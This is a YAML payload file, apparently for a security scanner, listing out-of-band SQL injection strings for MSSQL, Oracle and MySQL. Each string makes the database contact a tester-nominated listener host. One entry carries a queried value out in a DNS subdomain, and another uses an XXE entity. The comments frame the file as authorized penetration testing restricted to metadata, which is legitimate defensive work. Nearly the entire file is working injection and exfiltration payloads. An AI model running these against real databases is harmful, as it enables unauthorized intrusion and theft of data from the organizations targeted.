# Out-of-band interaction. {{OAST}} is the listener domain and {{TOKEN}} a value
# unique to each request -- without the token, an interaction cannot be
# attributed to this payload rather than to a scanner that saw the domain.
#
# Every entry reads metadata only. Prefixing a subquery over application tables
# would send client data to infrastructure outside the target's control.
id: sqli/oob
reviewed: "2026-08-23"   # not re-verified since; treat as unreviewed, not current
title: Out-of-band interaction constructs
variables: [OAST, TOKEN, EXPR]
credits:
  - "Out-of-band application security testing technique is public work published by PortSwigger; entries are written for this project."
safety: >
  These payloads cause the database tier to contact a host the tester nominates.
  Use a listener the tester operates or is contractually permitted to use, and
  extract only metadata -- a value placed in a subdomain leaves the client's
  network and is recorded by every resolver along the path.
entries:
  - name: DNS interaction via UNC path
    engine: [mssql]
    payload: "'; DECLARE @q VARCHAR(200); SET @q = '\\\\{{TOKEN}}.{{OAST}}\\a'; EXEC master..xp_dirtree @q--"
    detect: "A DNS lookup for {{TOKEN}}.{{OAST}} arrives at the listener."
    note: "Requires privileges the application user often lacks. A failure here is not evidence that egress is blocked -- record which reason applies."

  - name: DNS interaction carrying a value
    engine: [mssql]
    payload: "'; DECLARE @v VARCHAR(64); SELECT @v = ({{EXPR}}); DECLARE @q VARCHAR(300); SET @q = '\\\\' + @v + '.{{TOKEN}}.{{OAST}}\\a'; EXEC master..xp_dirtree @q--"
    detect: "The interaction's subdomain carries the computed value."
    note: "Keep {{EXPR}} to metadata such as DB_NAME(). Values containing characters invalid in a hostname will truncate the lookup."

  - name: HTTP interaction
    engine: [oracle]
    payload: "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{{TOKEN}}.{{OAST}}') FROM dual) IS NOT NULL AND 'a'='a"
    detect: "A DNS resolution for {{TOKEN}}.{{OAST}} arrives at the listener."
    note: "Network access control lists on modern Oracle commonly block this; an error naming the ACL is a distinct outcome from silence and should be recorded as such."

  - name: XXE-backed interaction
    engine: [oracle]
    payload: "' AND (SELECT EXTRACTVALUE(XMLTYPE('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://{{TOKEN}}.{{OAST}}/\">%p;]>'),'/l') FROM dual) IS NOT NULL AND 'a'='a"
    detect: "An HTTP request for the token path arrives at the listener."
    note: "Uses the XML parser rather than the network package, so it survives some ACL configurations that block the entry above."

  - name: file-read triggered lookup
    engine: [mysql]
    payload: "' AND LOAD_FILE(CONCAT('\\\\\\\\{{TOKEN}}.{{OAST}}\\\\a')) IS NOT NULL AND 'a'='a"
    detect: "A DNS lookup arrives at the listener when the server resolves the UNC path."
    note: "Windows hosts only, and requires FILE privilege with secure_file_priv unset. On Linux MySQL there is no equivalent, which is a result to record rather than a gap."

  - name: egress control probe
    payload: "' AND 1=1 AND 'a'='a"
    detect: "Baseline form. Record the listener's idle interaction count over the same window before and after, so background noise is not read as a callback."
    note: "Run this before any interaction payload. An interaction arriving during the control window means the listener is receiving unrelated traffic and the token check is mandatory."
